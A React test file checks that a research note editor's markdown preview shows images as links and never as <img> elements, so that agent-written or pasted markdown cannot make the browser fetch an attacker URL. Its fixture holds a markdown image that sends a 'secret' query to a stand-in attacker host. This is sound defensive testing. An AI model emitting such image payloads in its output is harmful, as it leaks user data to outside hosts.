/**
 * GOO-636 (FC-1): the note preview renders markdown that may come from the
 * agent or from pasted documents. An image there must never render as an
 * <img>, or the browser fetches an attacker-chosen URL on preview.
 *
 * Unlike NoteEditor.test.tsx, this file keeps the real react-markdown so the
 * component overrides actually run.
 */
import { describe, expect, it, vi } from 'vitest';
import { fireEvent, render, screen } from '@testing-library/react';
import { NoteEditor } from '@/components/research/NoteEditor';
import type { ProjectNote } from '@/services/projectService';

const note: ProjectNote = {
  id: 'note-1',
  project_id: 'project-1',
  user_id: 'user-1',
  title: 'Note',
  content: 'Seen here.\n\n![chart](https://attacker.example/x.png?q=secret)',
  tags: [],
  linked_document_ids: [],
  is_pinned: false,
  created_at: '2026-01-01T00:00:00Z',
  updated_at: '2026-01-01T00:00:00Z',
};

describe('NoteEditor preview images', () => {
  it('renders a note image as a click-only link, never an <img>', async () => {
    render(
      <NoteEditor
        isOpen
        initialNote={note}
        availableDocuments={[]}
        onClose={vi.fn()}
        onSave={vi.fn().mockResolvedValue(undefined)}
      />
    );

    fireEvent.click(screen.getByRole('button', { name: /preview/i }));

    const link = await screen.findByRole('link', { name: '[image: chart]' });
    expect(link).toHaveAttribute(
      'href',
      'https://attacker.example/x.png?q=secret'
    );
    expect(document.querySelector('img')).toBeNull();
  });
});
